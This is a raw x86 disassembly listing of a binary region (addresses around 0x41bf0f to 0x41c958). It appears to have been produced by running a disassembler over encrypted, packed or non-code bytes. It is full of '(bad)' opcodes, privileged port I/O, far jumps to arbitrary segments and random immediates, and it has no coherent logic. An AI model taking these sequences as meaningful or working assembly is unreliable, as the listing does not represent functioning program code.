  41bf0f:	adc    BYTE PTR [ebx],ah
  41bf11:	mov    ebp,0x6df8ca39
  41bf16:	lods   al,BYTE PTR ds:[esi]
  41bf17:	js     0x41bed4
  41bf19:	mov    edx,0x31aaf6a7
  41bf1e:	mov    ecx,0x104605b6
  41bf23:	sub    al,0x21
  41bf25:	and    cl,cl
  41bf27:	sbb    al,0x28
  41bf29:	xor    al,0x54
  41bf2b:	mov    esi,0x74b29fce
  41bf30:	jne    0x41beec
  41bf32:	mov    eax,ds:0xfdf252ca
  41bf37:	jle    0x41bf6b
  41bf39:	pop    edi
  41bf3a:	lahf   
  41bf3b:	std    
  41bf3c:	in     eax,0xa4
  41bf3e:	add    ebx,DWORD PTR [edi-0x5f]
  41bf41:	push   ebx
  41bf42:	push   esi
  41bf43:	push   eax
  41bf44:	mov    ebx,0x18ace80d
  41bf49:	xchg   esi,eax
  41bf4a:	sbb    BYTE PTR [eax+0x7d525e7a],bh
  41bf50:	sub    BYTE PTR [ebp+0x3c],bl
  41bf53:	shl    DWORD PTR [edi-0x7f],0x34
  41bf57:	and    DWORD PTR [ebp-0x10],0xffffffb9
  41bf5b:	(bad)  
  41bf5d:	outs   dx,DWORD PTR ds:[esi]
  41bf5e:	dec    ebp
  41bf5f:	sbb    eax,0x41569fd8
  41bf64:	ss push 0x8063d555
  41bf6a:	add    BYTE PTR [eax-0x188fdbd0],ah
  41bf70:	test   DWORD PTR [ecx+0x42cb56c2],ecx
  41bf76:	inc    edx
  41bf77:	icebp  
  41bf78:	or     DWORD PTR [ebx-0x421677f2],ecx
  41bf7e:	xchg   ecx,eax
  41bf7f:	xchg   esp,eax
  41bf80:	loop   0x41bfa1
  41bf82:	test   eax,0xfc22ecdc
  41bf87:	push   cs
  41bf88:	fadd   st(5),st
  41bf8a:	fs add al,0xac
  41bf8d:	sub    BYTE PTR [ebp+0xbce],cl
	...
  41bff3:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	repnz jmp 0x1:0x298aeae5
  41c008:	add    eax,0xb3000001
  41c00d:	leave  
  41c00e:	cli    
  41c00f:	jbe    0x41bfa9
  41c011:	xor    al,0x4e
  41c013:	jge    0x41c087
  41c015:	sbb    al,0x33
  41c017:	(bad)  
  41c018:	sbb    bl,dl
  41c01a:	adc    eax,0x6c77273c
  41c01f:	sub    ebp,DWORD PTR [esi-0x2a]
  41c022:	or     DWORD PTR [edi],0xae5af3f8
  41c028:	jno    0x41c082
  41c02a:	cld    
  41c02b:	add    BYTE PTR [eax],ch
  41c02d:	pop    ebp
  41c02e:	adc    esi,ecx
  41c030:	jno    0x41c055
  41c032:	inc    edx
  41c033:	mov    al,ds:0xf812d479
  41c038:	ror    BYTE PTR [ecx-0x14bfbcea],cl
  41c03e:	adc    dh,ch
  41c040:	jge    0x41c040
  41c042:	add    ebx,DWORD PTR ss:[edi-0x7f]
  41c046:	jp     0x41c014
  41c048:	fcmove st,st(5)
  41c04a:	loopne 0x41bffc
  41c04c:	push   edx
  41c04d:	jle    0x41c069
  41c04f:	and    BYTE PTR ds:0xd4f032,bl
  41c055:	inc    eax
  41c056:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c057:	push   eax
  41c058:	xchg   edi,eax
  41c059:	pop    ss
  41c05a:	pop    eax
  41c05b:	int3   
  41c05c:	sub    ah,BYTE PTR [ecx+0x35]
  41c05f:	inc    eax
  41c060:	or     ah,BYTE PTR [edi+0x39aba772]
  41c066:	jo     0x41c064
  41c068:	adc    ah,BYTE PTR [ebx-0x33387fa5]
  41c06e:	pop    DWORD PTR [ecx+eiz*1-0x2c]
  41c072:	inc    edx
  41c073:	retf   
  41c074:	fadd   QWORD PTR [esi+0x313aaea]
  41c07a:	pop    edi
  41c07b:	push   ecx
  41c07c:	xchg   ebx,eax
  41c07d:	imul   ebx,DWORD PTR [edi+0x6b],0xffffffa8
  41c081:	stc    
  41c082:	mov    esi,ebx
  41c084:	adc    esi,DWORD PTR [esi+0x25577c0c]
  41c08a:	imul   edx,DWORD PTR [eax+0x3e48a20f],0xffffff8a
  41c091:	sbb    al,0xf9
  41c094:	lods   al,BYTE PTR ds:[esi]
  41c095:	stos   DWORD PTR es:[edi],eax
  41c096:	hlt    
  41c097:	cmp    dl,BYTE PTR [esi+edx*2-0x4f9cef02]
  41c09e:	fmul   DWORD PTR [ebp-0x24]
  41c0a1:	rcl    DWORD PTR [esi+edx*4-0x4c],cl
  41c0a5:	lahf   
  41c0a6:	test   BYTE PTR [esi-0x7281b09c],al
  41c0ac:	(bad)
  41c0af:	sar    BYTE PTR [esi+0x18ccb536],1
  41c0b5:	pop    ebx
  41c0b6:	popf   
  41c0b7:	mov    ds:0xce5d9e63,eax
  41c0bc:	test   cl,dh
  41c0be:	push   esp
  41c0bf:	sub    bh,bl
  41c0c1:	inc    edi
  41c0c2:	fisub  WORD PTR [ebx]
  41c0c4:	add    al,0xb3
  41c0c6:	mov    cl,0x2
  41c0c8:	pop    ds
  41c0c9:	jno    0x41c142
  41c0cb:	xchg   ebx,eax
  41c0cc:	sbb    BYTE PTR [ebx-0x35],al
  41c0cf:	daa    
  41c0d0:	sub    cl,dh
  41c0d2:	mov    ds:0x2f3636d,al
  41c0d7:	fsub   st,st(6)
  41c0d9:	sub    DWORD PTR [eax],edx
  41c0db:	push   edi
  41c0dc:	retf   0x3afa
  41c0df:	cmp    al,0x78
  41c0e1:	hlt    
  41c0e2:	or     edx,DWORD PTR [eax]
  41c0e4:	inc    ebp
  41c0e5:	pushf  
  41c0e6:	jns    0x41c15e
  41c0e8:	pop    esp
  41c0e9:	dec    ebx
  41c0ea:	jno    0x41c141
  41c0ec:	push   0xfb693cf9
  41c0f1:	(bad)  
  41c0f2:	mov    edx,0xfc76e352
  41c0f7:	out    dx,eax
  41c0f8:	xchg   esp,eax
  41c0f9:	ds inc ebx
  41c0fb:	push   ss
  41c0fc:	retf   
  41c0fd:	cli    
  41c0fe:	sub    DWORD PTR [ebp-0x3b],ebx
  41c101:	adc    al,bh
  41c103:	loop   0x41c0dc
  41c105:	push   ecx
  41c106:	xor    DWORD PTR [ecx+0x10],edx
  41c109:	aam    0x1b
  41c10b:	mov    esp,0x77e0d4d0
  41c110:	add    BYTE PTR [eax],0x0
	...
  41c173:	add    cl,bl
  41c175:	dec    edx
  41c176:	mov    eax,ds:0xd9fbb3f8
  41c17b:	imul   edi,DWORD PTR ds:0x48e90501,0xffffffb8
  41c182:	(bad)
  41c186:	add    DWORD PTR [eax],eax
  41c188:	add    eax,0xdd000001
  41c18d:	sub    al,BYTE PTR [edx]
  41c18f:	shl    DWORD PTR [eax-0x8e9f982],cl
  41c195:	mov    ah,0x96
  41c197:	jecxz  0x41c1f6
  41c199:	scas   eax,DWORD PTR es:[edi]
  41c19a:	loope  0x41c126
  41c19c:	xor    al,0x3a
  41c19e:	add    esi,DWORD PTR [ebx]
  41c1a0:	jmp    0x52acac59
  41c1a5:	sbb    dh,ah
  41c1a7:	inc    ecx
  41c1a8:	loop   0x41c1c6
  41c1aa:	(bad)  
  41c1ab:	repz xchg ebp,eax
  41c1ad:	push   cs
  41c1ae:	mov    eax,ds:0xee0d1240
  41c1b3:	and    cl,dl
  41c1b5:	mov    DWORD PTR ds:0x580454f4,ebx
  41c1bb:	mov    dh,0x47
  41c1bd:	mov    ch,0x23
  41c1bf:	mul    BYTE PTR [eax]
  41c1c1:	add    DWORD PTR [ebx-0x3aa40c83],ebx
  41c1c7:	jno    0x41c23c
  41c1c9:	test   al,0x5d
  41c1cb:	and    DWORD PTR [ebx-0x33],eax
  41c1ce:	retf   0x1b0d
  41c1d1:	adc    esi,ecx
  41c1d3:	jg     0x41c15c
  41c1d5:	call   0x74bf:0x84e57db9
  41c1dc:	shl    BYTE PTR [eax+0x1eeb961d],1
  41c1e2:	test   DWORD PTR [edx-0xd],0x5dd4f6a3
  41c1e9:	in     eax,0x7b
  41c1eb:	cli    
  41c1ec:	daa    
  41c1ed:	hlt    
  41c1ee:	icebp  
  41c1ef:	add    eax,0x631bc6b5
  41c1f4:	test   BYTE PTR [ecx],bh
  41c1f6:	mov    BYTE PTR [eax],dl
  41c1f8:	loopne 0x41c229
  41c1fa:	cmp    DWORD PTR [edi+0x4a],ebx
  41c1fd:	lea    ebp,[edx+ecx*2+0x4b]
  41c201:	xchg   DWORD PTR [eax],ecx
  41c203:	cdq    
  41c204:	jge    0x41c1b4
  41c206:	jbe    0x41c23b
  41c208:	loope  0x41c1a0
  41c20a:	mov    ah,0xaa
  41c20c:	and    DWORD PTR [eax+ebp*2+0x5c],ecx
  41c210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c211:	add    ebp,DWORD PTR [ecx+0x734de9e4]
  41c217:	or     eax,0xc52f1582
  41c21c:	outs   dx,BYTE PTR ds:[esi]
  41c21d:	lahf   
  41c21e:	push   edi
  41c21f:	add    DWORD PTR [ebx-0x25830991],ebx
  41c225:	lods   al,BYTE PTR ds:[esi]
  41c226:	pop    ebp
  41c227:	push   esi
  41c228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c229:	adc    al,0xbf
  41c22b:	jmp    DWORD PTR [ebx]
  41c22d:	hlt    
  41c22e:	aam    0xc6
  41c230:	adc    dl,cl
  41c232:	sub    eax,DWORD PTR [ebx-0x16]
  41c235:	xchg   ecx,eax
  41c236:	push   esp
  41c237:	inc    edx
  41c238:	(bad)  
  41c239:	ins    BYTE PTR es:[edi],dx
  41c23a:	leave  
  41c23b:	dec    ecx
  41c23c:	add    cl,BYTE PTR [eax+0x2e]
  41c23f:	cli    
  41c240:	mov    al,ds:0x2935f523
  41c245:	sub    ch,BYTE PTR [edx*2-0x68215929]
  41c24c:	cmp    bl,BYTE PTR [edi-0x1a321c0c]
  41c252:	sub    ah,dl
  41c254:	inc    esp
  41c255:	sub    ecx,DWORD PTR [ebx]
  41c257:	into   
  41c258:	adc    BYTE PTR [esi-0x4],dh
  41c25b:	sbb    DWORD PTR [ecx],0xbc09d263
  41c261:	mov    ?,WORD PTR [esi+ecx*8-0x135ada58]
  41c268:	cmc    
  41c269:	jno    0x41c220
  41c26b:	aam    0x41
  41c26d:	xchg   edx,eax
  41c26e:	adc    eax,0xa9a184e7
  41c273:	pop    esi
  41c274:	iret   
  41c275:	nop
  41c276:	fild   WORD PTR [edi]
  41c278:	mov    ds:0x8e21687e,al
  41c27d:	adc    al,0xe7
  41c27f:	stos   DWORD PTR es:[edi],eax
  41c280:	jo     0x41c2ad
  41c282:	out    0x40,al
  41c284:	and    al,0x1d
  41c286:	fdivr  QWORD PTR [ecx+0x2b]
  41c289:	inc    esi
  41c28a:	pop    esi
  41c28b:	test   al,0x48
  41c28d:	fst    DWORD PTR [ebp-0xf]
  41c290:	jbe    0x41c292
	...
  41c2f2:	add    BYTE PTR [eax],al
  41c2f4:	repz and ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	pop    ds
  41c301:	iret   
  41c302:	mov    ds:0x12b9407,eax
  41c307:	add    BYTE PTR ds:0xbf000001,al
  41c30d:	popf   
  41c30e:	add    eax,0xdbf81bb8
  41c313:	imul   esp,DWORD PTR [edi-0x4b],0x6d
  41c317:	xor    DWORD PTR ds:0x4e90700b,ebp
  41c31d:	sub    DWORD PTR [ecx],ecx
  41c31f:	adc    ecx,eax
  41c321:	outs   dx,DWORD PTR ds:[esi]
  41c322:	lahf   
  41c323:	or     ah,bl
  41c325:	aad    0x11
  41c327:	sub    eax,0x8eb94842
  41c32c:	add    bl,bl
  41c32e:	mov    ds:0x31ff8fd6,al
  41c333:	sbb    bh,BYTE PTR [ecx-0x4576628b]
  41c339:	cdq    
  41c33a:	sbb    DWORD PTR [edi+0x2aabcab5],ebx
  41c340:	ret    
  41c341:	xchg   ecx,eax
  41c342:	pop    ss
  41c343:	push   es
  41c344:	mov    esp,0xdcdfcd76
  41c349:	xor    al,0x8b
  41c34b:	jnp    0x41c2ff
  41c34d:	outs   dx,DWORD PTR ds:[esi]
  41c34e:	jl     0x41c399
  41c350:	push   ds
  41c351:	push   ecx
  41c352:	cwde   
  41c353:	inc    eax
  41c354:	call   0x4d7:0x92d719d0
  41c35b:	inc    ecx
  41c35c:	ds dec ecx
  41c35e:	or     ebp,esp
  41c360:	sti    
  41c361:	mov    ch,0xcd
  41c363:	je     0x41c30d
  41c365:	gs jmp 0x926a:0x7d8a0c55
  41c36d:	dec    esi
  41c36e:	push   edx
  41c36f:	popf   
  41c370:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c371:	out    0xda,al
  41c373:	add    al,0x15
  41c375:	sbb    al,0x9f
  41c377:	xchg   esi,eax
  41c378:	ss out dx,al
  41c37a:	sbb    ecx,esi
  41c37c:	xor    al,0x5
  41c37e:	jb     0x41c38b
  41c380:	mov    ds:0x534d9d14,al
  41c385:	xchg   esi,eax
  41c386:	mov    ecx,0x44bc3fa
  41c38b:	pop    ss
  41c38c:	dec    ecx
  41c38d:	sub    dh,BYTE PTR [ebx+0x4]
  41c390:	cmp    al,0x36
  41c392:	and    al,0x43
  41c394:	jmp    0x41c394
  41c396:	ds push eax
  41c398:	mov    al,ds:0x8726cbb5
  41c39d:	push   ecx
  41c39e:	dec    esp
  41c3a0:	xlat   BYTE PTR ds:[ebx]
  41c3a1:	add    BYTE PTR [esi],dh
  41c3a3:	out    0xe6,eax
  41c3a5:	mov    eax,ds:0x19cdc013
  41c3aa:	sub    ebp,ebx
  41c3ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3ad:	bound  edx,QWORD PTR [esi+eax*1-0x2ed88525]
  41c3b4:	out    0x65,al
  41c3b6:	sub    DWORD PTR [eax-0x24222e88],esi
  41c3bc:	call   0x3ff9:0x465ed503
  41c3c3:	ins    DWORD PTR es:[edi],dx
  41c3c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3c5:	mov    al,0xc5
  41c3c7:	arpl   WORD PTR [ebx+0x3d1b7954],bp
  41c3cd:	adc    eax,0x7f656c94
  41c3d2:	icebp  
  41c3d3:	sub    eax,0x44983d51
  41c3d8:	mov    BYTE PTR [ebx+eax*8+0x4f],dl
  41c3dc:	adc    eax,0x1748d66d
  41c3e1:	adc    eax,0x5d12572b
  41c3e6:	int3   
  41c3e7:	push   edi
  41c3e9:	jmp    0x7211:0x5854ad2e
  41c3f0:	addr16 sbb al,0x6
  41c3f3:	mov    DWORD PTR [ecx+0x79662205],edi
  41c3f9:	and    eax,0xa04157da
  41c3fe:	test   al,0x1d
  41c400:	gs je  0x41c46c
  41c403:	sbb    al,0x8e
  41c405:	sbb    dl,ah
  41c407:	call   0xaff69a37
  41c40c:	pushf  
  41c40d:	cmp    eax,0x49ec25
	...
  41c472:	add    BYTE PTR [eax],al
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	in     al,0x82
  41c482:	rol    ecx,1
  41c484:	cdq    
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR ds:0x53000001,al
  41c48d:	clc    
  41c48e:	cs jae 0x41c4ea
  41c491:	fnsave [ebx]
  41c493:	and    esp,DWORD PTR [edx]
  41c495:	push   ss
  41c496:	inc    esp
  41c497:	daa    
  41c498:	push   edx
  41c499:	shr    dl,0xef
  41c49c:	mov    dl,0xca
  41c49e:	nop
  41c49f:	and    dl,cl
  41c4a1:	dec    ebp
  41c4a2:	jns    0x41c4e7
  41c4a4:	ds call 0xe50a:0x7783946
  41c4ac:	dec    edx
  41c4ad:	jne    0x41c45b
  41c4af:	cs leave 
  41c4b1:	mov    ah,0x77
  41c4b3:	retf   0x5a1a
  41c4b6:	fs (bad) 
  41c4b8:	sti    
  41c4b9:	mov    al,ds:0x11bb816
  41c4be:	mov    dh,0xa
  41c4c0:	or     al,0x73
  41c4c2:	into   
  41c4c3:	(bad)  
  41c4c4:	fsub   QWORD PTR [ecx]
  41c4c6:	mov    ds:0x63d726b6,eax
  41c4cb:	mov    ebp,0x4341d399
  41c4d0:	dec    edi
  41c4d1:	ss clc 
  41c4d3:	mov    ah,0xb3
  41c4d5:	shr    BYTE PTR [edx],0x9e
  41c4d8:	repnz xor eax,0xc8a1823b
  41c4de:	adc    al,0xc3
  41c4e0:	mov    eax,0x18eda5a0
  41c4e5:	pop    esi
  41c4e6:	jl     0x41c53e
  41c4e8:	push   esp
  41c4e9:	mov    ebx,0xace3f5bd
  41c4ee:	fidiv  WORD PTR [eax]
  41c4f0:	and    eax,0x7f02ab9c
  41c4f5:	cs mov ebx,0xd73085d0
  41c4fb:	jb     0x41c4ab
  41c4fd:	dec    edi
  41c4fe:	in     al,0xbe
  41c500:	mov    ah,0xa7
  41c502:	jae    0x41c4cf
  41c504:	xchg   esi,eax
  41c505:	gs push 0xffffffd5
  41c508:	mov    bl,0x6a
  41c50a:	nop
  41c50b:	shufps xmm7,XMMWORD PTR [eax-0x19dfb32e],0x6f
  41c513:	xor    eax,0x7cac2c7c
  41c518:	scas   eax,DWORD PTR es:[edi]
  41c519:	mov    BYTE PTR [esi-0x723613a4],cl
  41c51f:	sub    BYTE PTR ss:[ebx+esi*4],ch
  41c523:	clc    
  41c524:	loope  0x41c4e0
  41c526:	addr16 mov ecx,0xbbd438f8
  41c52c:	mov    ebx,0x2265ace4
  41c531:	xor    al,0x50
  41c533:	bsf    ebx,DWORD PTR [ecx-0x665cf09a]
  41c53a:	aad    0x63
  41c53c:	push   ebp
  41c53d:	push   esi
  41c53e:	nop
  41c53f:	sbb    al,0xff
  41c541:	fs vpmuludq zmm5{z},zmm3,zmm0
  41c548:	call   0xddc506d7
  41c54d:	dec    edx
  41c54e:	cmp    BYTE PTR [eax+0x64fe4923],al
  41c554:	push   0x2d
  41c556:	fstp   st(6)
  41c558:	mov    eax,ds:0x538e9e17
  41c55d:	push   esi
  41c55e:	push   ebp
  41c55f:	cli    
  41c560:	sbb    DWORD PTR [edx],esp
  41c562:	repz clc 
  41c564:	push   ds
  41c565:	int3   
  41c566:	xor    eax,0x9a92e060
  41c56c:	in     al,dx
  41c56d:	xchg   ecx,eax
  41c56e:	lds    esi,FWORD PTR [ebx+edi*4-0x33]
  41c572:	ja     0x41c5a9
  41c574:	jmp    0x41c51a
  41c576:	rcr    BYTE PTR [edx],0x21
  41c579:	aam    0x61
  41c57b:	dec    dl
  41c57d:	sti    
  41c57e:	mov    ds:0xb1f88425,al
  41c583:	int3   
  41c584:	mov    bl,0x7e
  41c586:	dec    esi
  41c587:	xchg   esi,eax
  41c588:	rol    DWORD PTR [edx+eiz*8],1
  41c58b:	add    edi,DWORD PTR [ebx+eiz*1-0x5]
  41c58f:	inc    edi
  41c590:	iret   
	...
  41c5f1:	add    BYTE PTR [eax],al
  41c5f3:	add    ch,al
  41c5f5:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c5fb:	jecxz  0x41c640
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d9e:0xcae5de63
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    eax,0xcd000001
  41c60d:	jae    0x41c5b9
  41c60f:	xchg   ebp,eax
  41c610:	cli    
  41c611:	(bad)
  41c614:	push   cs
  41c615:	mov    cl,0xcf
  41c617:	or     DWORD PTR [edi-0x3ecfc5a8],0xffffffbe
  41c61e:	fistp  DWORD PTR [edx]
  41c620:	sub    esi,DWORD PTR [esi]
  41c622:	int    0x44
  41c624:	neg    DWORD PTR [eax-0xc322c6c]
  41c62a:	sbb    DWORD PTR [ebp+0x7a],0xe6bdecd7
  41c631:	inc    edx
  41c632:	loopne 0x41c6a1
  41c634:	xchg   ebp,eax
  41c635:	add    DWORD PTR [ecx+0x302d6384],eax
  41c63b:	je     0x41c5d4
  41c63d:	adc    ecx,edi
  41c63f:	test   al,0x23
  41c641:	dec    esp
  41c642:	loope  0x41c5e9
  41c644:	nop
  41c645:	pop    di
  41c647:	sub    esp,0x6ade3484
  41c64d:	ds pop esp
  41c64f:	push   ebp
  41c650:	das    
  41c651:	cdq    
  41c652:	fiadd  WORD PTR [esi-0x5feb43e9]
  41c658:	add    BYTE PTR [edx+0x43258426],bl
  41c65e:	test   esp,esi
  41c660:	push   esi
  41c661:	mov    esp,0xfbd03881
  41c666:	cmc    
  41c667:	outs   dx,DWORD PTR ds:[esi]
  41c668:	and    DWORD PTR [edi+0x33],0xd3fbe010
  41c66f:	dec    ecx
  41c670:	push   0x6b3e198
  41c675:	sbb    dl,BYTE PTR [esi+edx*1-0x77]
  41c679:	inc    ecx
  41c67a:	adc    dl,BYTE PTR [eax+eiz*1-0x404aeb60]
  41c681:	jle    0x41c642
  41c683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c684:	cli    
  41c685:	push   cs
  41c686:	jno    0x41c702
  41c688:	dec    edi
  41c689:	out    0x4f,eax
  41c68b:	(bad)  
  41c68c:	push   eax
  41c68d:	pop    ebx
  41c68e:	jp     0x41c6e8
  41c690:	xor    DWORD PTR ds:0xf344ed14,0xffffffdc
  41c697:	cmc    
  41c698:	gs leave 
  41c69a:	es fmulp st(3),st
  41c69d:	pusha  
  41c69e:	xchg   bx,ax
  41c6a0:	push   ebp
  41c6a1:	fwait
  41c6a2:	or     eax,DWORD PTR [eax+edx*1]
  41c6a5:	retf   
  41c6a6:	pop    ebp
  41c6a7:	sub    cl,BYTE PTR [edx+0xb]
  41c6aa:	sub    eax,0x50ca15de
  41c6af:	std    
  41c6b0:	(bad)  
  41c6b2:	push   edi
  41c6b3:	iret   
  41c6b4:	cdq    
  41c6b5:	mov    esi,0xb8bc48fc
  41c6ba:	cmp    al,0xb8
  41c6bc:	mov    edi,0xe07f1d11
  41c6c1:	sub    eax,0x8cf7c228
  41c6c6:	cmc    
  41c6c7:	push   edx
  41c6c8:	inc    ebx
  41c6c9:	adc    dh,BYTE PTR [ebp-0x583bbfdd]
  41c6cf:	in     al,0x52
  41c6d1:	xor    al,0x57
  41c6d3:	sti    
  41c6d4:	adc    BYTE PTR [eax-0x2f3d6e5],0xfc
  41c6db:	mov    bh,0x99
  41c6dd:	jo     0x41c70e
  41c6df:	out    0x68,eax
  41c6e1:	retf   
  41c6e2:	cmp    edx,DWORD PTR [ebx+0x19a93bce]
  41c6e8:	jnp    0x41c69f
  41c6ea:	and    al,bl
  41c6ec:	shr    edx,0xac
  41c6ef:	push   edi
  41c6f0:	(bad)
  41c6f5:	int    0x70
  41c6f7:	mov    dh,BYTE PTR [ecx-0x3e]
  41c6fa:	ret    
  41c6fb:	mov    ecx,DWORD PTR [ecx+0x36]
  41c6fe:	inc    edx
  41c6ff:	mov    BYTE PTR [edi+0xef581eb],bh
  41c705:	std    
  41c706:	in     al,dx
  41c707:	punpcklwd mm4,mm3
  41c70a:	cmp    dh,dh
  41c70c:	out    dx,al
  41c70d:	(bad)  
  41c70e:	jae    0x41c75b
  41c710:	lea    eax,[eax]
	...
  41c772:	add    BYTE PTR [eax],al
  41c774:	fiadd  DWORD PTR [ecx]
  41c776:	ret    0xdb86
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	dec    ebx
  41c781:	lds    ebp,FWORD PTR gs:[ecx-0x5d]
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    eax,0x68000001
  41c78d:	mov    al,ds:0xb36cbeff
  41c792:	das    
  41c793:	nop
  41c794:	cmp    DWORD PTR [ebp-0x5dcb94ba],ecx
  41c79a:	pop    esp
  41c79b:	fcomi  st,st(0)
  41c79d:	sbb    ah,dh
  41c79f:	mov    ah,BYTE PTR [esi-0x6d]
  41c7a2:	sub    BYTE PTR [edi],bh
  41c7a4:	mov    edx,0xb63805b3
  41c7a9:	pushf  
  41c7aa:	fs xor edi,ebx
  41c7ad:	js     0x41c82e
  41c7af:	(bad)  
  41c7b0:	cmc    
  41c7b1:	dec    esp
  41c7b2:	mov    ds:0xdc93ab95,al
  41c7b7:	aaa    
  41c7b8:	sub    eax,0x751525fb
  41c7bd:	pop    edx
  41c7be:	rcr    BYTE PTR [ebx+0x75],cl
  41c7c1:	aam    0xd7
  41c7c3:	xchg   esp,eax
  41c7c4:	dec    edi
  41c7c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c7c6:	retf   
  41c7c7:	jo     0x41c79a
  41c7c9:	je     0x41c761
  41c7cb:	pop    ss
  41c7cc:	and    eax,0x783b1f1
  41c7d1:	jbe    0x41c7e1
  41c7d3:	mov    ah,0x92
  41c7d5:	inc    ebp
  41c7d6:	mov    ds:0x893cfaf7,al
  41c7db:	cwde   
  41c7dc:	js     0x41c7d5
  41c7de:	loopne 0x41c7e0
  41c7e0:	les    eax,FWORD PTR [edx+0x6aa0bab2]
  41c7e6:	addr16 (bad) 
  41c7e8:	es stc 
  41c7ea:	mov    edi,0x95131f8a
  41c7ef:	jae    0x41c861
  41c7f1:	lods   al,BYTE PTR ds:[esi]
  41c7f2:	mov    ch,BYTE PTR [ecx+0x70]
  41c7f5:	in     al,0xda
  41c7f7:	mov    eax,ds:0xc00cb667
  41c7fc:	jnp    0x41c79c
  41c7fe:	retf   0x5009
  41c801:	pop    ecx
  41c802:	and    al,0x9a
  41c804:	loope  0x41c82f
  41c806:	sbb    ebx,DWORD PTR [edx-0x64]
  41c809:	call   0x76f820c6
  41c80e:	jle    0x41c7e2
  41c810:	dec    edx
  41c811:	fldcw  WORD PTR [edx+ebx*8-0x11de12f3]
  41c818:	test   eax,0x7db77272
  41c81d:	fsubr  DWORD PTR [eax]
  41c81f:	jns    0x41c89a
  41c821:	cwde   
  41c822:	or     BYTE PTR [esi+0x11],dh
  41c825:	add    cl,BYTE PTR [ebx]
  41c827:	lea    esi,[ebx]
  41c829:	or     DWORD PTR [esi+0x1e],0x4c
  41c82d:	sub    BYTE PTR [ebp+0x71],ah
  41c830:	adc    DWORD PTR [eax+0x4b],esp
  41c833:	push   0xffffffdb
  41c835:	dec    edx
  41c836:	jg     0x41c878
  41c838:	xchg   ebp,eax
  41c839:	lods   al,BYTE PTR ds:[esi]
  41c83a:	jmp    0xfdcf4ed1
  41c83f:	iret   
  41c840:	mov    ch,0xdf
  41c842:	into   
  41c843:	xchg   esi,eax
  41c844:	out    0x7,al
  41c846:	iret   
  41c847:	and    eax,0x9ac5de6a
  41c84c:	sub    al,0xbf
  41c84e:	aad    0x22
  41c850:	bnd jp 0x41c8c9
  41c853:	(bad)
  41c857:	or     eax,0x2c7761b7
  41c85c:	mov    cl,0x8c
  41c85e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c85f:	xor    eax,0xb2e6688b
  41c864:	mov    DWORD PTR [ebp+0x71179301],esp
  41c86a:	pop    es
  41c86b:	cli    
  41c86c:	dec    edx
  41c86d:	shr    BYTE PTR [edi],0x46
  41c870:	jne    0x41c877
  41c872:	inc    esp
  41c873:	xchg   esp,eax
  41c874:	ret    0xdb91
  41c877:	mov    bl,BYTE PTR [eax+ebx*1]
  41c87a:	adc    al,0x58
  41c87c:	aam    0x1c
  41c87e:	imul   edi,DWORD PTR [edx-0x450190a0],0x1a
  41c885:	add    bh,ch
  41c887:	pop    ecx
  41c888:	sub    eax,0x8b002cd3
  41c88d:	jl     0x41c878
  41c88f:	inc    ecx
  41c890:	rol    DWORD PTR [eax],0x0
	...
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	aam    0x15
  41c902:	or     ebp,DWORD PTR ds:[eax+0x500012f]
  41c909:	add    DWORD PTR [eax],eax
  41c90b:	add    dl,dh
  41c90d:	out    dx,al
  41c90e:	shl    edx,1
  41c910:	cmp    BYTE PTR [ebx],ch
  41c912:	jge    0x41c96a
  41c914:	or     dl,al
  41c916:	mov    edx,0x6cdbbb64
  41c91b:	aas    
  41c91c:	cdq    
  41c91d:	jnp    0x41c91d
  41c91f:	and    dl,BYTE PTR [ebp-0x18]
  41c922:	xlat   BYTE PTR ds:[ebx]
  41c923:	retf   
  41c924:	jecxz  0x41c97f
  41c926:	adc    DWORD PTR [ebx-0x7e],edx
  41c929:	cmp    dh,dl
  41c92b:	mov    ds:0x42761c8c,al
  41c930:	inc    edx
  41c931:	ins    BYTE PTR es:[edi],dx
  41c932:	daa    
  41c933:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c934:	jmp    0x41c922
  41c936:	push   edx
  41c937:	lods   eax,DWORD PTR ds:[esi]
  41c938:	fcom   DWORD PTR [esi]
  41c93a:	push   cs
  41c93b:	sti    
  41c93c:	cmp    al,0x2f
  41c93e:	aaa    
  41c93f:	ins    BYTE PTR es:[edi],dx
  41c940:	out    0x1a,al
  41c942:	cdq    
  41c943:	mov    edi,DWORD PTR [ebp+0x17e25277]
  41c949:	frstor [eax-0x7d]
  41c94c:	test   eax,0x3ba7a090
  41c951:	fldcw  WORD PTR [ebp-0x60]
  41c954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c955:	pop    edx
  41c956:	jbe    0x41c9bc
  41c958:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
